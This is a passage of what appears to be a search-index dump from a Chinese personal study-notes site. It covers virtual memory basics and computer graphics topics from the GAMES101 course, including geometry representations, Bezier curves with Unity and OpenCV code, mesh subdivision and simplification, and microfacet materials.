\u5bb9\u91cf\uff0c\u800c\u7cfb\u7edf\u4e0a\u8fd0\u884c\u7684\u6240\u6709\u8fdb\u7a0b\u90fd\u5177\u6709\u76f8\u540c\u7684\u865a\u62df\u7a7a\u95f4\u5730\u5740\uff0c\u56e0\u6b64\uff0c\u865a\u62df\u7a7a\u95f4\u5730\u5740\u901a\u5e38\u6bd4\u7269\u7406\u7a7a\u95f4\u5730\u5740\u5927\u5f97\u591a\u3002</p> <p>\u4e4b\u524d\u7684\u7ae0\u8282\u4e2d\u6211\u4eec\u63d0\u5230\uff0c\u865a\u62df\u5730\u5740\u7a7a\u95f4\u5206\u4e3a Kernel Space \u548c User Space \uff0c\u5176\u4e2d\u53ea\u6709 kernel \u4ee3\u7801\u53ef\u4ee5\u8bbf\u95ee Kernel Space \u3002\u5b9e\u9645\u4e0a\uff0c\u7531\u4e8e\u6240\u6709\u8fdb\u7a0b\u7684 Kernel Space \u5185\u5bb9\u90fd\u76f8\u540c\uff0c\u6bcf\u4e2a\u8fdb\u7a0b\u7684\u5730\u5740\u7a7a\u95f4\u7684 Kernel Space \u90fd\u6620\u5c04\u5230\u540c\u4e00\u4e2a\u7269\u7406\u5185\u5b58\u4e0a\u3002</p> <ul> <li>\u7b2c\u4e00\uff0c\u5c06 DRAM \u89c6\u4e3a\u865a\u62df\u7a7a\u95f4\u5730\u5740\u7684\u4e00\u4e2a\u7f13\u5b58\uff0c\u4ec5\u4ec5\u5c06\u865a\u62df\u5730\u5740\u7a7a\u95f4\u7684\u4e00\u90e8\u5206\u5b9e\u9645\u5b58\u50a8\u5728\u7269\u7406\u5b58\u50a8\u5668\u4e2d\uff0c\u80fd\u591f\u66f4\u6709\u6548\u4f7f\u7528\u5185\u5b58<ul> <li>\u865a\u62df\u5730\u5740\u4e2d\u672a\u88ab\u7f13\u5b58\u7684\u5185\u5bb9\u4ecd\u7136\u5b58\u50a8\u5728\u78c1\u76d8\u4e2d\uff0c\u4f46\u4e0d\u5728 DRAM \u4e0a</li> </ul> </li> <li>\u7b2c\u4e8c\uff0c\u5927\u5927\u7b80\u5316\u4e86\u5185\u5b58\u7ba1\u7406</li> <li>\u7b2c\u4e09\uff0c\u5bf9\u8bbf\u5b58\u8fdb\u884c\u4fdd\u62a4\uff0c\u6bcf\u4e2a\u8fdb\u7a0b\u6709\u5176\u5355\u72ec\u7684\u5730\u5740\u7a7a\u95f4</li> </ul> <p>\u6709\u5173\u865a\u62df\u5185\u5b58\uff0c\u5177\u4f53\u5185\u5bb9\u5728\u5927\u4e09\u79cb\u51ac\u5b66\u671f\u64cd\u4f5c\u7cfb\u7edf\u8bfe\u4e0a\u6709\u6240\u8bb2\u89e3\uff0c\u6b64\u5904\u6211\u61d2\u5f97\u6df1\u5165\u7814\u7a76\u4e86\ud83d\ude02</p>"},{"location":"Accumulation/Games101/","title":"index","text":""},{"location":"Accumulation/Games101/#index","title":"index","text":"<p> \u7ea6 18 \u4e2a\u5b57  13 \u884c\u4ee3\u7801  \u9884\u8ba1\u9605\u8bfb\u65f6\u95f4\u4e0d\u5230 1 \u5206\u949f</p>"},{"location":"Accumulation/Games101/#environment-with-wsl","title":"Environment with WSL","text":"<p>\u3010\u73af\u5883\u914d\u7f6e\u3011Windows 11 \u7684 WSL(Ubuntu2204) \u5b89\u88c5OpenCV 4.5.4</p>"},{"location":"Accumulation/Games101/#eigen","title":"Eigen","text":"<pre><code>#include&lt;Eigen/Dense&gt;\n#include&lt;iostream&gt;\n\nEigen::Matrix2d mat1 &lt;&lt; 1, 2,\n                        3, 4; // \u5b9a\u4e49\u4e8c\u7ef4\u6574\u6570\u77e9\u9635\nEigen::Matrix2d inv = mat1.inverse(); // \u77e9\u9635\u6c42\u9006\n\nEigen::Matrix4f view = Eigen::Matrix4f::Identity(); // \u5b9a\u4e49\u56db\u7ef4\u6d6e\u70b9\u6570\u5355\u4f4d\u77e9\u9635\nEigen::Matrix2f subMat = view.block(0,0,2,2); // \u4ece(0,0)\u5f00\u59cb\u53d6 2*2 \u5b50\u77e9\u9635\n\nEigen::EigenSolver&lt;Eigen::Matrix2f&gt; eigenSolver(submat);\nstd::cout&lt;&lt; \"Eigenvalue:\\n\" &lt;&lt; eigenSolver.eigenvalues() &lt;&lt; \"\\n\\n\";\n// \u8ba1\u7b97\u7279\u5f81\u503c\n</code></pre>"},{"location":"Accumulation/Games101/Geometry/","title":"Geometry","text":""},{"location":"Accumulation/Games101/Geometry/#geometry","title":"Geometry","text":"<p> \u7ea6 1567 \u4e2a\u5b57  94 \u884c\u4ee3\u7801  1 \u5f20\u56fe\u7247  \u9884\u8ba1\u9605\u8bfb\u65f6\u95f4 9 \u5206\u949f</p>"},{"location":"Accumulation/Games101/Geometry/#introduction","title":"Introduction","text":"<p>\u9690\u5f0f\u51e0\u4f55\uff1a \\(f(x,y,z)=0\\)</p> <p>\u4f7f\u7528\u9690\u5f0f\u8868\u793a\uff0c\u53ef\u80fd\u96be\u4ee5\u60f3\u60f3\u56fe\u5f62\u957f\u4ec0\u4e48\u6837\uff1b\u4f46\u662f\u5f88\u65b9\u4fbf\u5224\u65ad\u67d0\u4e00\u70b9\u662f\u5426\u5728\u56fe\u5f62\u4e0a</p> <p>\u663e\u5f0f\u51e0\u4f55\uff1a\u76f4\u63a5\u7ed9\u51fa\u6216\u901a\u8fc7\u53c2\u6570\u6620\u5c04\u7ed9\u51fa\u5404\u4e2a\u70b9\uff08\u6216\u5c0f\u4e09\u89d2\u5f62\uff09\u7684\u5750\u6807</p> <p>\u5bf9\u4e8e\u540c\u6837\u4e00\u4e2a\u51e0\u4f55\u5f62\u4f53(y\u548cz\u8c03\u6362\u4e00\u4e0b)\uff1a</p> <p></p> ImplicitExplicit \\[f(x,y,z)=(2-\\sqrt{x^2 +y^2}) ^2 +z^2 -1\\] \\[f(u,v)=((2+\\cos u)\\cos v, (2+\\cos u) \\sin v, \\sin u)\\]"},{"location":"Accumulation/Games101/Geometry/#implicit","title":"Implicit","text":""},{"location":"Accumulation/Games101/Geometry/#constructive-solid-geometry","title":"Constructive Solid Geometry","text":""},{"location":"Accumulation/Games101/Geometry/#distance-functions","title":"Distance Functions","text":"<p>\u5bf9\u6bcf\u4e2a\u70b9\u7ef4\u62a4\u5b83\u4eec\u79bb\u51e0\u4f55\u56fe\u5f62\u6700\u8fd1\u7684\u8ddd\u79bb\uff0c\u5f53\u4e24\u4e2a\u56fe\u5f62\u9700\u8981 Blend \u65f6\uff0c\u5c06 Signed Distance Function \u76f8\u52a0\u4ee5\u66f4\u65b0\uff1a</p> <p></p> <p>\u5f53\u6211\u4eec\u5bf9\u4e24\u4e2a\u51e0\u4f55\u5f62\u4f53\u8fdb\u884c Blend \u65f6\uff0c\u9762\u4e0a\u67d0\u4e2a\u70b9\u7684\u8ddd\u79bb\u51fd\u6570\u66f4\u65b0\u4e3a\u5176\u5bf9\u5206\u522b\u4e24\u4e2a\u56fe\u5f62\u7684\u8ddd\u79bb\u51fd\u6570\u7684\u76f8\u52a0\uff0c\u5219\u878d\u5408\u540e\u7684\u51e0\u4f55\u5f62\u4f53\u7684\u8fb9\u754c\u4e3a\u65b0\u7684\u8ddd\u79bb\u51fd\u6570\u7b49\u4e8e0\u7684\u70b9\u3002</p> <p></p>"},{"location":"Accumulation/Games101/Geometry/#level-set-methods","title":"Level Set Methods","text":"<p>\u4e0e\u8ddd\u79bb\u51fd\u6570\u7c7b\u4f3c\uff0c\u4f46\u662f\u662f\u6bcf\u4e2a\u683c\u5b50\u7ef4\u62a4\u4e00\u4e2a\u76f8\u5bf9\u9ad8\u5ea6\u3002</p> <p></p> <p>\u5373\u7b49\u9ad8\u7ebf</p>"},{"location":"Accumulation/Games101/Geometry/#fractals","title":"Fractals","text":"<p>\u5373\u5206\u5f62\uff0c\u53ef\u4ee5\u7c7b\u6bd4\u7b97\u6cd5\u4e2d\u7684\u9012\u5f52\uff0c\u7528\u6765\u63cf\u8ff0\u81ea\u76f8\u4f3c\u7684\u51e0\u4f55\u56fe\u5f62\uff0c\u4f46\u662f\u8f83\u96be\u63a7\u5236\u5f62\u72b6\u3002</p> <p>\u6bd4\u5982\u96ea\u82b1\u3002</p>"},{"location":"Accumulation/Games101/Geometry/#explicit","title":"Explicit","text":""},{"location":"Accumulation/Games101/Geometry/#point-cloud","title":"Point Cloud","text":"<p>\u7528\u4e00\u7ec4\u70b9\u8868\u793a\u51e0\u4f55\u56fe\u5f62\uff0c\u70b9\u4e91\u5bc6\u5ea6\u8db3\u591f\u5927\u624d\u80fd\u8868\u793a\u4e00\u4e2a\u8f83\u4e3a\u590d\u6742\u7684\u6a21\u578b\u3002</p> <p>\u5728\u5b9e\u9645\u5e94\u7528\u4e2d\u901a\u5e38\u9700\u8981\u8f6c\u6362\u4e3a\u4e09\u89d2\u5f62\u9762\u3002</p>"},{"location":"Accumulation/Games101/Geometry/#polygon-mesh","title":"Polygon Mesh","text":"<p>\u591a\u8fb9\u5f62\u9762\u8868\u793a\u662f\u56fe\u5f62\u5b66\u4e2d\u4f7f\u7528\u6700\u5e7f\u6cdb\u7684\u663e\u5f0f\u51e0\u4f55\uff0c\u975e\u5e38\u65b9\u4fbf\u8fdb\u884c\u5904\u7406\u3001\u4eff\u771f\u3001\u91c7\u6837\u7b49\u64cd\u4f5c\u3002</p> <p>\u5728 Wavefront Object File (<code>.obj</code>) \u4e2d\uff0c\u591a\u8fb9\u5f62\u9762\u7684\u683c\u5f0f\u5982\u4e0b\uff1a</p> <pre><code>v  0.23639098 17.838633 1.3139851    # \u9876\u70b9\u5750\u6807\n\nvt 0.499264 0.29569197 0             # \u7eb9\u7406\u5750\u6807\n\nvn 0.41076726 0.49810898 -0.76364768 # \u6cd5\u7ebf\n\nf  12/11/15 12/11/15 12/11/15        # \u8fde\u63a5\u5173\u7cfb\uff0cface\n   # \u4f8b\u5982 12/11/15 \u6307\u7b2c12\u4e2av\uff0c\u7b2c11\u4e2avt\uff0c\u7b2c15\u4e2avn\u4e3a\u4e00\u7ec4\n   # \u5728Unity\u4e2d\u76f8\u5f53\u4e8eMesh\u7c7b\u7684indices\u6570\u7ec4\n</code></pre>"},{"location":"Accumulation/Games101/Geometry/#bezier-curves","title":"Bezier Curves","text":"<p>\u8d1d\u585e\u5c14\u66f2\u7ebf\u4f7f\u7528\u4e00\u7cfb\u5217\u63a7\u5236\u70b9\u6765\u5b9a\u4e49\u4e00\u6bb5\u66f2\u7ebf\u3002</p> <p>\u5148\u8003\u8651\u53ea\u6709\u4e09\u4e2a\u63a7\u5236\u70b9\u7684\u4e8c\u9636\u8d1d\u585e\u5c14\u66f2\u7ebf\uff08quadratic Bezier\uff09\uff1a</p> <p></p> <p>\u5176\u4e2d \\(\\frac{b_0 b_0^1}{ b_0 b_1} = \\frac{b_1 b_1^1}{b _1 b_2} = \\frac{b_0^1 b_0^2 }{b_0^1 b_1^1} = t\\)</p> <p>\u6570\u5b66\u4e0a\uff0c\u6613\u8bc1\u660e\u5f97\u5230\uff08\u4e0a\u6807\u8868\u793a\u5c42\u6570\uff0c\u4e0d\u662f\u5e73\u65b9\uff09\uff1a</p> \\[\\begin{array}c b_0^1(t) =(1-t)b_0 +tb_1 \\\\ b_1^1(t) =(1-t)b_1 +tb_2 \\\\ b_0^2(t) =(1-t)b_0^1 +tb_1^1 \\\\ \\Rightarrow b_0^2 = (1-t)^2b_0 +2t(1-t) b_1 +t^2b_2 \\end{array}\\] <p>\u540c\u6837\u9002\u7528\u4e8e\u66f4\u591a\u70b9\u6570\uff1a</p> <p></p> <p>\u90a3\u4e48\u6709 Bernstein Form of order n\uff1a</p> \\[\\begin{array}c b^n(t) = b_0^n(t) = \\sum_{j=0}^n b_j B_j^n(t) \\\\ B_j^n(t) = C_n ^i t^i (1-t)^{n-i} \\end{array} \\] <p>\u5176\u4e2d \\(B_j^n(t)\\) \u79f0\u4e3a Bernstein polynomial\u3002</p> <p>\u6700\u5e38\u7528\u7684\u662f\u6709\u56db\u4e2a\u63a7\u5236\u70b9\u7684\u56db\u9636\u8d1d\u585e\u5c14\u66f2\u7ebf Cubic Bezier</p> <p>\u8d1d\u585e\u5c14\u66f2\u7ebf\u6709\u5982\u4e0b\u6027\u8d28\uff1a</p> <ul> <li>\u8d77\u70b9\u548c\u7ec8\u70b9\u6ee1\u8db3\uff1a\\(b(0)= b_0, b(1)=b_n\\)</li> <li>\u8d77\u70b9\u548c\u7ec8\u70b9\u7684\u5207\u7ebf\u6ee1\u8db3\uff1a\\(b'(0)=n(b_1 -b_0), b'(1)= n(b_n -b_{n-1})\\)</li> <li>\u5bf9\u63a7\u5236\u70b9\u5148\u505a\u4eff\u5c04\u53d8\u6362\u518d\u753b\u8d1d\u585e\u5c14\u66f2\u7ebf\u5f97\u5230\u7684\u7ed3\u679c\u4e0e\u5bf9\u63a7\u5236\u70b9\u5148\u753b\u8d1d\u585e\u5c14\u66f2\u7ebf\u518d\u5bf9\u66f2\u7ebf\u4eff\u5c04\u53d8\u6362\u4e00\u6837\uff08\u51e0\u4f55\u4e0d\u53d8\u6027\uff09</li> <li>\u8d1d\u585e\u5c14\u66f2\u7ebf\u4e00\u5b9a\u4f4d\u4e8e\u63a7\u5236\u70b9\u5f62\u6210\u7684\u51f8\u5305\u5185</li> </ul> <p>Convex Hull</p> <p>\u5373\u80fd\u5305\u56f4\u7ed9\u5b9a\u70b9\u7684\u6700\u5c0f\u51f8\u591a\u8fb9\u5f62</p> <p>\u901a\u5e38\u4f7f\u7528 Piecewise cubic Bezier curve \uff08\u5206\u6bb5\uff0c\u6bcf\u56db\u4e2a\u70b9\uff0c\u8d1d\u585e\u5c14\u66f2\u7ebf\uff09\u4f5c\u4e3a\u66f2\u7ebf\u63cf\u8ff0\u3002\u4f8b\u5982 PS \u4e2d\u7ed9\u51fa\u7684\u94a2\u7b14\u5de5\u5177\u5c31\u662f\u91c7\u7528\u56db\u4e2a\u70b9\u4f5c\u4e3a\u63a7\u5236\u70b9\u6765\u753b\u51fa\u8d1d\u585e\u5c14\u66f2\u7ebf\u3002</p> <p></p> <p>You can try in Bezier curve edit</p> <p>\u8fde\u7eed\u6027</p> <p>\u82e5\u53ea\u662f\u65b9\u5411\u76f8\u540c\uff0c\u5b9a\u4e49\u4e3a\u8be5\u5904 C0 Continuity\uff1b\u82e5\u65b9\u5411\u548c\u8ddd\u79bb\u90fd\u76f8\u540c\uff0c\u5b9a\u4e49\u4e3a\u8be5\u5904 C1 Continuity</p> <p>\u7528 <code>Unity</code> \u5199\u7684\u4e00\u4e2a\u8d1d\u585e\u5c14\u66f2\u7ebf\u5b9e\u73b0\uff1a</p> <pre><code>public class BezierCurve : MonoBehaviour\n{\n    public Transform[] referencePointTransforms;\n    public Transform curvePointTransform;\n    Vector3[] mReferencePoints;\n    int mSign = 1;\n    float t = 0;\n    int mResolution = 100;\n\n    void Update()\n    {\n        TransformsToVectors();\n        t = Mathf.Clamp(t, 0, 1);\n        // curvePointTransform.position = GetCurvePointDeCasteljau(mReferencePoints, t);\n        curvePointTransform.position = GetCurvePointByBernstein(mReferencePoints, t);\n        t += Time.deltaTime * 0.2f * mSign;\n        if (t &gt; 1 || t &lt; 0)\n            mSign *= -1;\n    }\n\n    void OnDrawGizmos()\n    {\n        TransformsToVectors();\n        if (mReferencePoints.Length == 0)\n            return;\n\n        //\u753b\u63a7\u5236\u70b9\u8fde\u7ebf\n        Gizmos.color = Color.red;\n        for (int i = 0; i &lt; mReferencePoints.Length - 1; i++)\n            Gizmos.DrawLine(mReferencePoints[i], mReferencePoints[i + 1]);\n\n        //\u753b\u66f2\u7ebf\n        Gizmos.color = Color.green;\n        Vector3 start = mReferencePoints[0];\n        for (int i = 1; i &lt;= mResolution; i++)\n        {\n            Vector3 end = GetCurvePointDeCasteljau(mReferencePoints, (float)i / mResolution);\n            Gizmos.DrawLine(start, end);\n            start = end;\n        }\n    }\n\n    void TransformsToVectors()\n    {\n        int referencePointCount = referencePointTransforms.Length;\n        mReferencePoints = new Vector3[referencePointCount];\n        for (int i = 0; i &lt; referencePointCount; i++)\n            mReferencePoints[i] = referencePointTransforms[i].position;\n    }\n}\n</code></pre> <p>\u4f7f\u7528C++ <code>openCV</code> \u7684 de Casteljau's algorithm \u5b9e\u73b0\u65b9\u5f0f\uff1a</p> <pre><code>void naive_bezier(const std::vector&lt;cv::Point2f&gt; &amp;points, cv::Mat &amp;window) \n{\n    // Benstein basis: B_i^n(t) = C(n, i) * t^i * (1 - t)^(n - i), b^n = sum(B_i^n(t) * P_i)\n    auto &amp;p_0 = points[0];\n    auto &amp;p_1 = points[1];\n    auto &amp;p_2 = points[2];\n    auto &amp;p_3 = points[3];\n\n    for (double t = 0.0; t &lt;= 1.0; t += 0.001) \n    {\n        auto point = std::pow(1 - t, 3) * p_0 + 3 * t * std::pow(1 - t, 2) * p_1 +\n                 3 * std::pow(t, 2) * (1 - t) * p_2 + std::pow(t, 3) * p_3;\n\n        window.at&lt;cv::Vec3b&gt;(point.y, point.x)[2] = 255;\n        // Blue; Green; Red = (0, 0, 255)\n    }\n}\n\ncv::Point2f recursive_bezier(const std::vector&lt;cv::Point2f&gt; &amp;control_points, float t) \n{\n    // de Casteljau's algorithm by recursive\n    std::vector&lt;cv::Point2f&gt; points;\n    if (control_points.size() == 1)\n        return control_points[0];\n\n    cv::Point2f Pre_point = control_points[0];\n    for (auto iter = control_points.begin() + 1; iter != control_points.end(); ++iter)\n    {\n        points.push_back(Pre_point + t * (*iter - Pre_point));\n        Pre_point = *iter;\n    }\n    return recursive_bezier(points, t);;\n\n}\n\nvoid bezier(const std::vector&lt;cv::Point2f&gt; &amp;control_points, cv::Mat &amp;window) \n{\n    for (double t = 0.0; t &lt;= 1.0; t += 0.001)\n    {\n        auto point = recursive_bezier(control_points, t);\n        window.at&lt;cv::Vec3b&gt;(point.y, point.x)[1] = 255;\n    }\n\n}\n</code></pre> <p>\u867d\u7136\u9012\u5f52\u5f62\u5f0f\u6162\uff0c\u4f46\u662f\u65b9\u4fbf\u652f\u6301\u66f4\u591a\u70b9\u7684\u8d1d\u585e\u5c14\u66f2\u7ebf</p>"},{"location":"Accumulation/Games101/Geometry/#bezier-surfaces","title":"Bezier Surfaces","text":"<p>For bi-cubic Bezier surface patch,</p> <ul> <li>Input: 4 * 4 Control Points</li> <li>Output: 2D surface parameterized by \\((u,v)\\) in \\([0,1]^2\\)</li> </ul> <p>\u5177\u4f53\u505a\u6cd5\u662f\u5bf9\u6bcf\u56db\u4e2a\u70b9\u90fd\u753b\u51fa\u5bf9\u5e94\u7684\u8d1d\u585e\u5c14\u66f2\u7ebf\uff0c\u518d\u5bf9\u6bcf\u56db\u4e2a\u8d1d\u585e\u5c14\u66f2\u7ebf\u4e0a \\(t\\) \u65f6\u523b\u8fd0\u52a8\u7684\u56db\u4e2a\u70b9\u753b\u51fa\u753b\u51fa\u4e00\u4e2a moving curve\u3002</p> <p></p>"},{"location":"Accumulation/Games101/Geometry/#mesh-operation","title":"Mesh Operation","text":"<ul> <li>Subdivision \u7ec6\u5206</li> <li>Simplification \u7b80\u5316</li> </ul>"},{"location":"Accumulation/Games101/Geometry/#loop-subdivision","title":"Loop Subdivision","text":"<p>Loop \u7ec6\u5206\u548c\u5faa\u73af\u6ca1\u5173\u7cfb\uff0c\u662f\u56e0\u4e3a\u7b97\u6cd5\u7684\u53d1\u660e\u4eba\u59d3 Loop</p> <ul> <li>&lt;1&gt; Split each triangle into four<ul> <li>\u8fde\u63a5\u4e09\u89d2\u5f62\u6bcf\u6761\u8fb9\u7684\u4e2d\u70b9\uff0c\u5c06\u5176\u62c6\u5206\u4e3a\u56db\u4e2a\u5c0f\u4e09\u89d2\u5f62</li> </ul> </li> <li> <p>&lt;2&gt; Assign new vertex positions according to weights</p> <ul> <li>\u6839\u636e\u6743\u91cd\u66f4\u65b0\u9876\u70b9\u7684\u4f4d\u7f6e</li> </ul> </li> <li> <p>\u5bf9\u4e8e\u65b0\u9876\u70b9\uff08\u4e2d\u70b9\uff09\uff0c\u5b83\u4e0e\u4e24\u4e2a\u9876\u70b9\u76f4\u63a5\u8fde\u63a5\uff0c\u4e0e\u4e24\u4e2a\u9876\u70b9\u4e0d\u76f4\u63a5\u8fde\u63a5\u4f46\u5728\u540c\u4e00\u4e2a\u4e09\u89d2\u5f62\u5185\uff0c\u90a3\u4e48\u5bf9\u5176\u52a0\u6743\u5e73\u5747\u66f4\u65b0\uff1a</p> </li> </ul> <p></p> <ul> <li>\u5bf9\u4e8e\u65e7\u9876\u70b9\uff0c\u6839\u636e\u8fde\u63a5\u7684\u65e7\u5b9a\u70b9\u6570\uff08\u8be5\u8282\u70b9\u7684\u5ea6\uff09\u9009\u62e9\u4e0d\u540c\u7684\u6743\u91cd\u52a0\u6743\u5e73\u5747\uff1a</li> </ul> <p></p>"},{"location":"Accumulation/Games101/Geometry/#catmull-clark-subdivision","title":"Catmull-Clark Subdivision","text":"<p>\u4e0a\u8ff0 Loop \u7ec6\u5206\u53ea\u80fd\u5e94\u7528\u4e8e\u7f51\u683c\u5448\u4e09\u89d2\u5f62\u7684\u6a21\u578b\uff0c\u800c Catmull-Clark \u7ec6\u5206\u9002\u7528\u4e8e\u66f4 General \u7684\u7f51\u683c\u3002</p> <p>\u5b9a\u4e49\u975e\u56db\u8fb9\u5f62\u9762\u4e3a <code>Non-quad face</code> \uff0c\u5b9a\u4e49\u5ea6\u4e0d\u4e3a\u56db\u7684\u70b9\u4e3a <code>Extraordinary vertex</code> :</p> <p></p> <p>\u5bf9\u6bcf\u4e00\u4e2a\u9762\u53d6\u4e2d\u5fc3\u70b9\uff0c\u5bf9\u6bcf\u4e00\u6761\u8fb9\u53d6\u4e2d\u70b9\uff0c\u5e76\u628a\u8fd9\u4e9b\u65b0\u7684\u70b9\u5168\u90e8\u8fde\u63a5\u8d77\u6765\u3002\u90a3\u4e48\u7ec6\u5206\u4e4b\u540e\uff0c\u5728 <code>Non-quad face</code> \u4e2d\u4f1a\u589e\u52a0\u4e00\u4e2a\u5947\u5f02\u70b9\uff0c\u800c\u6240\u6709\u7684\u975e\u56db\u8fb9\u5f62\u9762\u5747\u6d88\u5931\uff1a</p> <p></p> <p>\u6240\u4ee5\u5728\u4e4b\u540e\u7684\u7ec6\u5206\u4e2d\uff0c\u5947\u5f02\u70b9\u7684\u4e2a\u6570\u4e0d\u4f1a\u589e\u52a0\u3002</p> <p>\u5750\u6807\u66f4\u65b0\u7684\u52a0\u6743\u5e73\u5747\u7b97\u6cd5\u5982\u4e0b\uff1a</p> <p></p> <p>Quote</p> <p></p>"},{"location":"Accumulation/Games101/Geometry/#collapsing-an-edge-simplification","title":"Collapsing An Edge Simplification","text":"<p>\u5728\u4fdd\u7559\u6574\u4f53\u5f62\u72b6\u7684\u524d\u63d0\u4e0b\u51cf\u5c11\u7f51\u683c\u9762\u6570\uff0c\u4ece\u800c\u964d\u4f4e\u6027\u80fd\u9700\u6c42\u3002</p> <p>\u5728 Games101 \u8bfe\u7a0b\u4e2d\u4ecb\u7ecd\u7684\u7b80\u5316\u7b97\u6cd5\u4e3a\u8fb9\u574d\u7f29\u3002</p> <p>\u4e3a\u4e86\u5b9e\u73b0\u8fd9\u4e2a\u7b97\u6cd5\uff0c\u6211\u4eec\u5f15\u5165\u4e8c\u6b21\u8bef\u5dee\uff08Quadric Error\uff09\u7684\u6982\u5ff5\uff0c\u5176\u5b9a\u4e49\u4e3a\u4e00\u4e2a\u65b0\u9876\u70b9\u5230\u539f\u672c\u76f8\u5173\u7684\u4e09\u89d2\u5f62\u5e73\u9762\u7684\u8ddd\u79bb\u7684\u5e73\u65b9\u548c\u3002</p> <p></p> <p>\u7c7b\u4f3c\u673a\u5668\u5b66\u4e60\u4e2d\u7684 <code>L2 Distance</code></p> <p>\u5bf9\u4e8e\u6574\u4e2a\u6a21\u578b\uff0c\u8ba1\u7b97\u6bcf\u4e00\u6761\u8fb9\u574d\u7f29\u540e\u9020\u6210\u7684\u4e8c\u6b21\u8bef\u5dee\uff0c\u800c\u9009\u62e9\u8bef\u5dee\u6700\u5c0f\u7684\u8fb9\u574d\u7f29\u3002\u574d\u7f29\u540e\u66f4\u65b0\u4e0e\u8fd9\u4e24\u4e2a\u70b9\u76f8\u8fde\u7684\u6240\u6709\u8fb9\u7684\u8bef\u5dee\u503c\uff0c\u7136\u540e\u7ee7\u7eed\u574d\u7f29\u3002</p> <p></p> <p>\u6570\u636e\u7ed3\u6784</p> <p>\u8be5\u7b97\u6cd5\u7684\u4e00\u822c\u64cd\u4f5c\u4e3a\u53d6\u6700\u5c0f\u503c\u4ee5\u53ca\u4fee\u6539\u952e\u503c\uff0c\u6240\u4ee5\u7528\u6765\u5b58\u50a8\u4e8c\u6b21\u8bef\u5dee\u503c\u7684\u6570\u636e\u7ed3\u6784\u5e94\u8be5\u9009\u62e9\u4f18\u5148\u961f\u5217\u3002</p> <p>\u8fd9\u5b9e\u9645\u4e0a\u662f\u4e00\u79cd\u8d2a\u5fc3\u7b97\u6cd5\uff0c\u5e76\u4e0d\u4fdd\u8bc1\u7ed3\u679c\u7684\u6700\u4f18\u6027</p>"},{"location":"Accumulation/Games101/Materials%20and%20Appearances/","title":"Materials and Appearances","text":""},{"location":"Accumulation/Games101/Materials%20and%20Appearances/#materials-and-appearances","title":"Materials and Appearances","text":"<p> \u7ea6 555 \u4e2a\u5b57  \u9884\u8ba1\u9605\u8bfb\u65f6\u95f4 3 \u5206\u949f</p>"},{"location":"Accumulation/Games101/Materials%20and%20Appearances/#matrials-overview","title":"Matrials Overview","text":"<p>\u5728\u56fe\u5f62\u5b66\u4e2d\uff0c\u6750\u8d28 == BRDF\uff0c\u5373\u6e32\u67d3\u65b9\u7a0b\u4e2d\u7684 \\(f_r\\) \u3002</p> <p>\u5bf9\u4e8e\u6f2b\u53cd\u5c04\u9762(Diffuse)\uff0c\u5176 BRDF \u548c \\(L_i(\\omega _i)\\) \u90fd\u53ef\u89c6\u4e3a\u5e38\u6570\uff0c\u5219\u5176 BRDF \u53d6\u503c\u4e3a \\([0, \\frac{1}{\\pi}]\\)\uff1a</p> <p></p> <p>\u5bf9\u4e8e\u6bcf\u4e2a\u989c\u8272\uff0c\u90fd\u53ef\u8bbe\u7f6e\u5176\u5bf9\u5e94\u7684 BRDF\uff0c\u5c06\u5176\u770b\u4f5c\u591a\u7ef4\u5411\u91cf\u770b\u5f85\u5373\u53ef\u3002</p> <p>\u67d0\u4e9b\u8868\u9762\u6574\u4f53\u5448\u5149\u6ed1\u7684\u955c\u9762\uff0c\u4f46\u662f\u5c40\u90e8\u53c8\u6709\u70b9\u51f9\u51f8\u4e0d\u5e73\uff0c\u8fd9\u79cd\u6750\u8d28\u79f0\u4e3a Glossy\uff0c\u4f8b\u5982\u53e4\u4ee3\u6280\u672f\u4e0d\u90a3\u4e48\u53d1\u8fbe\u7684\u94dc\u955c\u7b49\u3002</p> \u53cd\u5c04\u6298\u5c04 <p></p> <p></p>"},{"location":"Accumulation/Games101/Materials%20and%20Appearances/#microfacet-material","title":"Microfacet Material","text":"<p>\u8ddd\u79bb\u8db3\u591f\u8fdc\u65f6\uff0c\u8868\u9762\u4e0a\u5f88\u591a\u5fae\u5c0f\u7684\u7ec6\u8282\u90fd\u770b\u4e0d\u5230\uff0c\u5373\u5fae\u8868\u9762\u6a21\u578b\uff1a\u5b8f\u89c2\u4e0a\u770b\u5916\u89c2\uff0c\u5fae\u89c2\u4e0a\u770b\u51e0\u4f55</p> <p></p> <p>\u5219\u5fae\u8868\u9762\u6a21\u578b\u7684 BRDF \u5b9a\u4e49\u5982\u4e0b\uff1a</p> \\[ f(i,o)=\\frac{F(i,h)G(i,o,h)D(h)}{4(n, i)(n,o)} \\] <ul> <li>\\(F(i,h)\\) Fresnel Term, \u83f2\u6d85\u5c14\u65b9\u7a0b\uff0c\u63cf\u8ff0\u4e86\u7269\u4f53\u8868\u9762\u5728\u4e0d\u540c\u5165\u5c04\u5149\u89d2\u5ea6\u4e0b\u53cd\u5c04\u5149\u7ebf\u6240\u5360\u6bd4\u7387</li> <li>\\(G(i,o,h)\\) Geometry Function, \u51e0\u4f55\u51fd\u6570\uff0c\u63cf\u8ff0\u4e86\u5fae\u8868\u9762\u81ea\u906e\u6321\u7684\u5c5e\u6027\u3002\u5f53\u4e00\u4e2a\u5e73\u9762\u76f8\u5bf9\u7c97\u7cd9\u65f6\uff0c\u5e73\u9762\u8868\u9762\u4e0a\u7684\u5fae\u5e73\u9762\u53ef\u80fd\u6321\u4f4f\u5176\u5b83\u5fae\u5e73\u9762\u4ece\u800c\u51cf\u5c11\u53cd\u5c04\u7684\u5149\u7ebf</li> <li>\\(D(h)\\) Normal Distribution Function, \u6cd5\u7ebf\u5206\u5e03\u51fd\u6570\uff0c\u5176\u4ee3\u8868\u5fae\u89c2\u89d2\u5ea6\u4e0b\u6240\u6709\u5fae\u5c0f\u955c\u9762\u6cd5\u7ebf\u5206\u5e03\u60c5\u51b5\u3002\u7c97\u7cd9\u8868\u9762\u6cd5\u7ebf\u5206\u5e03\u5747\u5300\uff0c\u5149\u6ed1\u8868\u9762\u6cd5\u7ebf\u5206\u5e03\u96c6\u4e2d\u3002</li> </ul> <p>\u8bf7\u770b\u8fd9\u7bc7 \u57fa\u4e8e\u7269\u7406\u7684\u6e32\u67d3\uff1a\u5fae\u5e73\u9762\u7406\u8bba(Cook-Torrance 